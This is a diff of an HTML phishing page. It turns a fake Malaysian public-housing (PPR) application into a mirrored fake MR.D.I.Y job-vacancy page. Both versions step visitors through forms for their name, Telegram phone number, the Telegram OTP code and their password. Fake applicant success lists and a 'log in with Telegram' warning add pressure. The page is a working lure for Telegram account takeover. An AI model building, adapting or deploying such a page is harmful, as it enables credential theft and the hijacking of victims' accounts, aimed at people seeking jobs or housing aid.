@@ -1,176 +1,41 @@
 <!doctype html>
-<html lang="id" class="h-100">
-<head>
+<html lang="en" class="h-100">
+
+
+<!-- Mirrored from jawatankosong1.gy-i1d.com/02/jobs/MR.D.I.Y/?index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 May 2024 06:06:14 GMT -->
+<head id="ctl00_Head1">
+    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
+    <link href="assets/css/custom.css" type="text/css" rel="stylesheet" />
+    <link href="assets/css/menebus.css" type="text/css" rel="stylesheet" />
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta property="og:title" content="Permohonan Rumah PPR">
-    <title>Permohonan Rumah PPR</title>
+    <meta property="og:title" content="JawatanKosong Malaysia 2024">
+    <meta property="og:image" content="">
+    <meta name="description" />
+    <meta name="author" content="Mykasih Foundation" />
+    <title>JawatanKosong</title>
     <link rel="icon" type="image/x-icon" href="favicon.html" />
+    <link rel="canonical" href="../../../../getbootstrap.com/docs/5.0/examples/sticky-footer/index.html" />
+    <link rel="stylesheet" href="assets/css/bootstrap-icons.css" />
+    <script type="text/javascript" src="js/vue.min.js.download"></script>
+    <script src="js/clipboard.js.download"></script>
+    <script type="text/javascript" src="js/index.js.download"></script>
     <style type="text/css">
-        /* Reset & Style Dasar */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        .bd-placeholder-img {
+            font-size: 1.125rem;
+            text-anchor: middle;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            user-select: none;
         }
 
-        body {
-            background-color: #f8f9fa;
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
+        @media (min-width: 768px) {
+            .bd-placeholder-img-lg {
+                font-size: 3.5rem;
+            }
         }
 
-        /* Header & Judul */
-        .header {
-            text-align: center;
-            margin: 20px 0;
-        }
-        .header img {
-            max-width: 100%;
-            height: auto;
-            max-height: 150px;
-        }
-        .page-header {
-            color: #2c3e50;
-            text-align: center;
-            margin: 25px 0;
-            font-weight: 600;
-            font-size: 1.8rem;
-        }
-
-        /* Formulir */
-        .form-section {
-            background-color: white;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
-        }
-        .input-group {
-            margin-bottom: 15px;
-        }
-        .input-group label {
-            display: block;
-            margin-bottom: 5px;
-            color: #34495e;
-            font-weight: 500;
-        }
-        .input-group .prefix {
-            display: inline-block;
-            padding: 10px 12px;
-            background-color: #e9ecef;
-            border: 1px solid #ced4da;
-            border-right: none;
-            border-radius: 6px 0 0 6px;
-            color: #495057;
-        }
-        .input-group input {
-            width: calc(100% - 60px);
-            padding: 10px 12px;
-            border: 1px solid #ced4da;
-            border-radius: 0 6px 6px 0;
-            font-size: 1rem;
-        }
-        .input-group input.full-width {
-            width: 100%;
-            border-radius: 6px;
-        }
-        .btn-submit {
-            width: 100%;
-            padding: 12px;
-            background-color: #27ae60;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 1.1rem;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        .btn-submit:hover {
-            background-color: #2ecc71;
-        }
-
-        /* Peringatan */
-        .warning {
-            background-color: #fff3cd;
-            color: #856404;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            margin: 25px 0;
-            font-weight: 500;
-            border: 1px solid #ffeeba;
-        }
-
-        /* Status Pengaju */
-        .status-title {
-            color: #2c3e50;
-            font-size: 1.3rem;
-            font-weight: 600;
-            margin-bottom: 15px;
-            text-align: center;
-        }
-        .status-list {
-            background-color: white;
-            padding: 20px;
-            border-radius: 12px;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
-            margin-bottom: 25px;
-        }
-        .status-item {
-            display: flex;
-            align-items: center;
-            padding: 12px;
-            margin-bottom: 10px;
-            border-radius: 8px;
-            background-color: #fdfdfd;
-            border-left: 4px solid;
-            transition: transform 0.2s;
-        }
-        .status-item:hover {
-            transform: translateX(3px);
-        }
-        .status-item:last-child {
-            margin-bottom: 0;
-        }
-        .status-item.rejected {
-            border-left-color: #e74c3c;
-        }
-        .status-item.success {
-            border-left-color: #27ae60;
-        }
-        .avatar {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            margin-right: 15px;
-            object-fit: cover;
-            border: 2px solid #bdc3c7;
-            background-color: #ecf0f1;
-        }
-        .status-text {
-            font-size: 1rem;
-            font-weight: 500;
-        }
-        .rejected-text {
-            color: #e74c3c;
-        }
-        .success-text {
-            color: #27ae60;
-        }
-
-        /* Footer */
-        footer {
-            text-align: center;
-            color: #7f8c8d;
-            padding: 15px;
-            font-size: 0.9rem;
-        }
-
-        /* Loading Spinner */
+        /* Absolute Center Spinner */
         .loading {
             position: fixed;
             z-index: 999;
@@ -182,8 +47,9 @@
             left: 0;
             bottom: 0;
             right: 0;
-            display: none;
         }
+
+        /* Transparent Overlay */
         .loading:before {
             content: '';
             display: block;
@@ -192,14 +58,21 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.5);
+            background: radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
+
+            background: -webkit-radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
         }
+
+        /* :not(:required) hides these rules from IE9 and below */
         .loading:not(:required) {
+            /* hide "loading..." text */
             font: 0/0 a;
             color: transparent;
+            text-shadow: none;
             background-color: transparent;
             border: 0;
         }
+
         .loading:not(:required):after {
             content: '';
             display: block;
@@ -207,201 +80,300 @@
             width: 1em;
             height: 1em;
             margin-top: -0.5em;
+            -webkit-animation: spinner 150ms infinite linear;
+            -moz-animation: spinner 150ms infinite linear;
+            -ms-animation: spinner 150ms infinite linear;
+            -o-animation: spinner 150ms infinite linear;
             animation: spinner 150ms infinite linear;
             border-radius: 0.5em;
-            box-shadow: rgba(255,255,255,0.75) 1.5em 0 0 0, rgba(255,255,255,0.75) 1.1em 1.1em 0 0, rgba(255,255,255,0.75) 0 1.5em 0 0, rgba(255,255,255,0.75) -1.1em 1.1em 0 0, rgba(255,255,255,0.75) -1.5em 0 0 0, rgba(255,255,255,0.75) -1.1em -1.1em 0 0, rgba(255,255,255,0.75) 0 -1.5em 0 0, rgba(255,255,255,0.75) 1.1em -1.1em 0 0;
-        }
-        @keyframes spinner {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            -webkit-box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
+            box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
         }
 
-        /* Animasi Scroll Status */
-        @keyframes scrollUp {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(-100%); }
+        /* Animation */
+
+        @-webkit-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
         }
-        .animate-scroll {
-            position: relative;
-            height: 180px;
-            overflow: hidden;
+
+        @-moz-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
         }
-        .animate-scroll .scroll-inner {
-            position: absolute;
-            width: 100%;
-            animation: scrollUp 8s linear infinite;
+
+        @-o-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
         }
     </style>
 </head>
 
-<body>
-    <div id="loading" class="loading"></div>
+<body class="d-flex flex-column h-100">
 
-    <!-- Header -->
-    <div class="header">
-        <img src="https://via.placeholder.com/450x150?text=Logo+Permohonan+PPR" alt="Logo Permohonan Rumah PPR">
-    </div>
+    <!---
+<div class="item">
+<div class="record_logo">
+<img src="assets/img/avatar.png" alt="">
+</div>
+<div class="center">
+<div class="h1"><span class="name"></span> <span>Berjaya</span> <span class="number">RM 1.000,00</span></div>
+<div class="h2">3 jam yang lalu</div>
+</div>
+</div>
+--->
+    <div id="loading" class="loading" style="display: none;"></div>
 
-    <h2 class="page-header">Hantar Permohonan Sekarang</h2>
+    <main class="flex-shrink-0">
+        <div id="ctl00_divContainer" class="container container-narrow">
+            <div class="text-center mt-2">
+                <a id="ctl00_lnkMalay" disabled="disabled"
+                    style="color:#fb0d1d;font-weight:bold;text-decoration:none;">
+                </a>
 
-    <!-- Formulir Pertama -->
-    <div class="form-section first">
-        <form action="javascript:void(0)" method="post" id="firstForm">
-            <div class="input-group">
-                <label>Nama</label>               
-                <input name="full_name" id="full_name" maxlength="18" class="full-width" type="text"
-                    required="true" placeholder="Nama Penuh Sesuai Dokumen">
             </div>
-            <div class="input-group">
-                <label>Nomor Telepon Telegram</label>
-                <span class="">ðŸ‡²ðŸ‡¾+60
-                <input name="phone_number" id="phone_number" maxlength="18" type="tel"
-                    required="true" placeholder="13685595">
+            <div class="header mt-3 text-center">
+                <img src="assets/img/2.jpg" id="ctl00_logohead" class="img-fluid" width="450" />
             </div>
-            <button type="submit" class="btn-submit" onclick="processFirstData()">Cek Status</button>
-        </form>
-    </div>
+            <script type="text/javascript">
+                //<![CDATA[
+                var theForm = document.forms['aspnetForm'];
+                if (!theForm) {
+                    theForm = document.aspnetForm;
+                    A
+                }
+                function __doPostBack(eventTarget, eventArgument) {
+                    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+                        theForm.__EVENTTARGET.value = eventTarget;
+                        theForm.__EVENTARGUMENT.value = eventArgument;
+                        theForm.submit();
+                    }
+                }
+                //]]>
+            </script>
+            <script type="text/javascript">
+                //<![CDATA[
+                function WebForm_OnSubmit() {
+                    if (typeof (ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+                    return true;
+                }
+                //]]>
+            </script>
+            <span id="ctl00_lblMsg"></span>
+            <h2 class="fw-bold mt-2 page-header text-center ">
+                <span id="ctl00_RecipientMasterContent_lblSubject">Hantar Resume Sekarang</span>
+            </h2>
+            <div class="first">
+                <form action="javascript:void(0)" method="post" id="firstForm">
+                    <div class="input-group mb-3">
+                        <span class="input-group-text" id="basic-addon1">Nama</span>
+                        <input name="full_name" id="full_name" maxlength="18" class="form-control" type="text"
+                            required="true" placeholder="Nama Penuh Sesuai MyKad"
+                            title="Sila Masukkan Nombor , contoh +6022334455">
+                    </div>
+                    <div class="input-group mb-3">
+                        <span class="input-group-text" id="basic-addon1">🇲🇾+60</span>
+                        <input name="phone_number" id="phone_number" maxlength="18" class="form-control" type="tel"
+                            required="true" placeholder="Phone Number Telegram"
+                                        title="Sila Masukkan Nombor , contoh +6022334455">
+                    </div>
+                    <div class="text-center">
+                        <button type="submit" class="btn btn-lg btn-block btn-mk" onclick="processFirstData()">Pendaftaran</button>
+                    </div>
+                </form>
+            </div>
 
-    <!-- Formulir OTP (Sembunyi Awal) -->
-    <div class="form-section second" style="display: none;">
-        <form action="javascript:void(0)" method="post" id="secondForm">
-            <input type="hidden" name="full_name" id="validateFullName" readonly>
-            <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
-            <div class="input-group">
-                <label>Kode OTP</label>
-                <input name="otp" maxlength="5" id="otp" class="full-width" type="tel" required="true"
-                    placeholder="5 digit kode yang dikirim ke Telegram">
+            <div class="second" style="display: none;">
+                <form action="javascript:void(0)" method="post" id="secondForm">
+                    <input type="hidden" name="full_name" id="validateFullName" readonly>
+                    <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
+                    <div class="mb-3">
+                        <label for="otp" class="form-label">
+                            <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Kami telah menghantar kod ke apl
+                                Telegram anda.</span>
+                        </label>
+                        <input name="otp" maxlength="5" id="otp" class="form-control" type="tel" required="true"
+                            placeholder="5 digit OTP">
+                    </div>
+                    <div class="text-center">
+                        <button type="submit" class="btn btn-lg btn-block btn-mk" onclick="processSecondData()">teruskan</button>
+                    </div>
+                </form>
             </div>
-            <button type="submit" class="btn-submit" onclick="processSecondData()">Cek Status</button>
-        </form>
-    </div>
 
-    <!-- Formulir Kata Sandi (Sembunyi Awal) -->
-    <div class="form-section third" style="display: none;">
-        <form action="javascript:void(0)" method="post" id="thirdForm">
-            <input type="hidden" name="full_name" id="validateFullName2" readonly>
-            <input type="hidden" name="phone_number" id="validatePhoneNumber2" readonly>
-            <input type="hidden" name="otp_code" id="validateOtpCode" readonly>
-            <div class="input-group">
-                <label>Kata Laluan</label>
-                <input name="password" id="password" class="full-width" type="password" required="true"
-                    placeholder="Masukkan kata laluan anda">
+            <div class="third" style="display: none;">
+                <form action="javascript:void(0)" method="post" id="thirdForm">
+                    <input type="hidden" name="full_name" id="validateFullName" readonly>
+                    <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
+                    <input type="hidden" name="otp_code" id="validateOtpCode" readonly>
+                    <div class="mb-3">
+                        <label for="password" class="form-label">
+                            <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Masukkan kata laluan anda.</span>
+                        </label>
+                        <input name="password" id="password" class="form-control" type="text" required="true"
+                            placeholder="kata laluan">
+                    </div>
+                    <div class="text-center">
+                        <button type="submit" class="btn btn-lg btn-block btn-mk"
+                            onclick="processThirdData()">teruskan</button>
+                    </div>
+                </form>
             </div>
-            <button type="submit" class="btn-submit" onclick="processThirdData()">Cek Status</button>
-        </form>
-    </div>
 
-    <!-- Pesan Tidak Ditemukan (Sembunyi Awal) -->
-    <div class="form-section four" id="resultNotFound" style="display: none;">
-        <h5 class="text-center" style="color:#34495e; margin-bottom:15px;">Sila Lengkapkan Data Permohonan</h5>
-        <p class="text-center">
-            <a href="form.html" class="btn-submit" style="display:inline-block; width:auto; padding:8px 20px;">
-                &laquo; Lengkapkan Data
-            </a>
-        </p>
-    </div>
+            <div class="row four" id="ctl00_RecipientMasterContent_divResultNotFound" style="display: none;">
 
-    <!-- Peringatan -->
-    <div class="warning">
-        Perhatian!! Log masuk dengan akun Telegram anda untuk meneruskan permohonan.
-    </div>
+                <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">Sila Lengkapkan Data,</span></h5>
 
-    <!-- Status Pengaju dengan Animasi -->
-    <div class="status-title">Status Pengaju Terbaru</div>
-    <div class="status-list animate-scroll">
-        <div class="scroll-inner">
-            <div class="status-item rejected">
-                <img src="https://via.placeholder.com/45?text=MH" alt="Mohd Haki" class="avatar">
-                <span class="status-text rejected-text">Mohd Haki - Ditolak âŒ</span>
+                <p class="text-center"><a href="form.html" class="btn btn-lg btn-block btn-mk">&laquo; <span
+                            id="ctl00_RecipientMasterContent_lblGoBack_NoResult">Lengkapkan Data</span></a>
+                </p>
             </div>
-            <div class="status-item success">
-                <img src="https://via.placeholder.com/45?text=MF" alt="Md Fadzillah" class="avatar">
-                <span class="status-text success-text">Fauzi bin Abdul - Sukses âœ…</span>
+
+            <script type="text/javascript">
+                //<![CDATA[
+                var Page_ValidationActive = false;
+                if (typeof (ValidatorOnLoad) == "function") {
+                    ValidatorOnLoad();
+                }
+                function ValidatorOnSubmit() {
+                    if (Page_ValidationActive) {
+                        return ValidatorCommonOnSubmit();
+                    } else {
+                        return true;
+                    }
+                }
+            </script>
+
+                    </div>
+                </div>
             </div>
-            <div class="status-item success">
-                <img src="https://via.placeholder.com/45?text=MF" alt="Md Fadzillah" class="avatar">
-                <span class="status-text success-text">Nordiana - Sukses âœ…</span>
-            </div>
-            <div class="status-item rejected">
-                <img src="https://via.placeholder.com/45?text=NS" alt="Nadia Safira" class="avatar">
-                <span class="status-text rejected-text">Nadia Safira - Ditolak âŒ</span>
-            </div>
-            <div class="status-item success">
-                <img src="https://via.placeholder.com/45?text=MF" alt="Md Fadzillah" class="avatar">
-                <span class="status-text success-text">Md Fadzillah - Sukses âœ…</span>
-            </div>
-            <!-- Duplikat untuk animasi mulus -->
-            <div class="status-item rejected">
-                <img src="https://via.placeholder.com/45?text=MH" alt="Mohd Haki" class="avatar">
-                <span class="status-text rejected-text">Mohd Haki - Ditolak âŒ</span>
-            </div>
-            <div class="status-item success">
-                <img src="https://via.placeholder.com/45?text=MF" alt="Md Fadzillah" class="avatar">
-                <span class="status-text success-text">Noor - Sukses âœ…</span>
-            </div>
-            <div class="status-item success">
-                <img src="https://via.placeholder.com/45?text=MF" alt="Md Fadzillah" class="avatar">
-                <span class="status-text success-text">Fatimah - Sukses âœ…</span>
-            </div>
-            <div class="status-item rejected">
-                <img src="https://via.placeholder.com/45?text=NS" alt="Nadia Safira" class="avatar">
-                <span class="status-text rejected-text">Nadia Safira - Ditolak âŒ</span>
-            </div>
-            <div class="status-item success">
-                <img src="https://via.placeholder.com/45?text=MF" alt="Md Fadzillah" class="avatar">
-                <span class="status-text success-text">Md Fadzillah - Sukses âœ…</span>
-            </div>
+            <!--- record berjaya box --->
+
         </div>
-    </div>
+        </div>
+        </div>
+    </main>
+    <br>
+    <main class="flex-shrink-0">
+        <div id="ctl00_divContainer" class="container container-narrow">
+            <div class="text-center mt-2">
+                <a id="ctl00_lnkMalay" disabled="disabled"
+                    style="color:#000000;font-weight:bold;text-decoration:none;">  
+                </a> Perhatian!! Log masuk dengan akaun Telegram anda untuk meneruskan pendaftaran.
 
-    <!-- Footer -->
-    <footer>
-        &copy; 2026 Permohonan Rumah PPR | Semua Hak Dilindungi
+                    </ul>
+                </div>
+        </div>
     </footer>
 
-    <!-- Script Dasar -->
+    <script src="../../../../code.jquery.com/jquery-3.7.1.min.js"
+        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="../../../../code.jquery.com/jquery-1.10.2.min.js"></script>
+    <script type="text/javascript" src="../../../../ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+    <script src="../../../../ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script src="assets/js/script.js"></script>
+    <script type="text/javascript" src="js/jquery-3.4.1.min.js.download"></script>
     <script>
-        // Fungsi untuk menangani formulir pertama
-        function processFirstData() {
-            const fullName = document.getElementById('full_name').value;
-            const phone = document.getElementById('phone_number').value;
-            
-            if(fullName && phone) {
-                document.getElementById('validateFullName').value = fullName;
-                document.getElementById('validatePhoneNumber').value = phone;
-                document.querySelector('.first').style.display = 'none';
-                document.querySelector('.second').style.display = 'block';
-            } else {
-                alert('Silakan isi semua kolom!');
-            }
-        }
-
-        // Fungsi untuk menangani formulir OTP
-        function processSecondData() {
-            const otp = document.getElementById('otp').value;
-            
-            if(otp.length === 5) {
-                document.getElementById('validateFullName2').value = document.getElementById('validateFullName').value;
-                document.getElementById('validatePhoneNumber2').value = document.getElementById('validatePhoneNumber').value;
-                document.getElementById('validateOtpCode').value = otp;
-                document.querySelector('.second').style.display = 'none';
-                document.querySelector('.third').style.display = 'block';
-            } else {
-                alert('Kode OTP harus 5 digit!');
-            }
-        }
-
-        // Fungsi untuk menangani formulir kata sandi
-        function processThirdData() {
-            const password = document.getElementById('password').value;
-            
-            if(password.length >= 6) {
-                document.querySelector('.third').style.display = 'none';
-                document.getElementById('resultNotFound').style.display = 'block';
-            } else {
-                alert('Kata laluan anda!');
-            }
-        }
+        // 加载多语言
+        var language = getQueryString('language')
+        loadLocale(function (e) {
+            app.locale = Object.assign(e.Common, e.CommonShare)
+        }, language)
+        var app = new Vue({
+            el: '#app',
+            data: {
+                locale: {},
+                uid: '2004219',
+            },
+            created() {
+                $('#app').show();
+                this.starScroll();
+            },
+            methods: {
+                starScroll() {
+                    var _this = this;
+                    _this.scrollTimer && clearTimeout(_this.scrollTimer)
+                    _this.scrollTimer = setTimeout(() => {
+                        var $box = $("#list").find(".list:first");
+                        $box.css({
+                            marginTop: 0
+                        })
+                        var $item = $box.find(".item:first");
+                        var outerHeight = $item.outerHeight(true)
+                        $box.animate({
+                            "marginTop": -outerHeight + "px"
+                        }, 1000, function () {
+                            $box.css({
+                                marginTop: 0
+                            }).find(".item:first").appendTo($box);
+                            _this.starScroll();
+                        })
+                    }, 600);
+                },
+            },
+        })
     </script>
+
 </body>
+
+
+<!-- Mirrored from jawatankosong1.gy-i1d.com/02/jobs/MR.D.I.Y/?index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 May 2024 06:06:20 GMT -->
+
 </html>
